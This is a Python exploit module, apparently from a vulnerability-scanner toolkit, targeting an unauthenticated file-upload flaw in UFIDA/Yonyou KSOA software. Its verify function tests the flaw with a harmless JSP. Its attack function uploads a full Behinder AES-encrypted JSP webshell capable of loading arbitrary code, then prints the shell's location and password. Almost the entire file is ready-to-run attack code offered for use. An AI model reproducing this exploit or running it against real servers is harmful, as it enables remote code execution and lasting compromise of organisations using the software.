import requests
import re, time
import urllib, random, string

def verify(url):
    result = {
        'name': 'UFIDA 用友时空KSOA软件 前台文件上传漏洞(2022HVV)',
        'vulnerable': False,
        'attack': True,
        'about': "https://github.com/luck-ying/Library-POC/blob/be26ae4e4c5bdec61dfc485d183826d09fe7e490/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B-KSOA-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/yonyou-KSOA-Arbitrary-File-upload.py",
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    shell = f'<% out.println("{randstr1}" + "{randstr2}"); %>'
    payload = '/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=test.jsp'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
    }
    vurl = urllib.parse.urljoin(url, payload)
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=shell, verify=False)
        if rep.status_code == 200:
            return_path = re.search('(?<=<root>).*(?=</root>)', rep.text).group(0)
            verify_url = urllib.parse.urljoin(url, return_path)
            time.sleep(1)
            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200 and re.search(randstr1 + randstr2, rep2.text):
                result['vulnerable'] = True
                result['verify'] = verify_url
        return result
    except:
        return result

def attack(url):
    shell = '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'
    filename = ''.join(random.sample(string.digits + string.ascii_letters, 8)) + '.jsp'
    payload = f'/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename={filename}'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
    }
    vurl = urllib.parse.urljoin(url, payload)
    print("[+] exploit loading ......")
    try:
        time.sleep(2)
        print("[+] 开始上传webshell")
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=shell, verify=False)
        if rep.status_code == 200:
            print("[+] 上传成功，正在检查是否存在？")
            return_path = re.search('(?<=<root>).*(?=</root>)', rep.text).group(0)
            print("[*] 成功获得上传路径，path: ", return_path)
            verify_url = urllib.parse.urljoin(url, return_path)
            time.sleep(1)
            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200:
                print("[*] 上传成功! webshell(冰蝎3): ", verify_url)
                print("[*] 密码: rebeyond")
                return True
        return False
    except:
        return False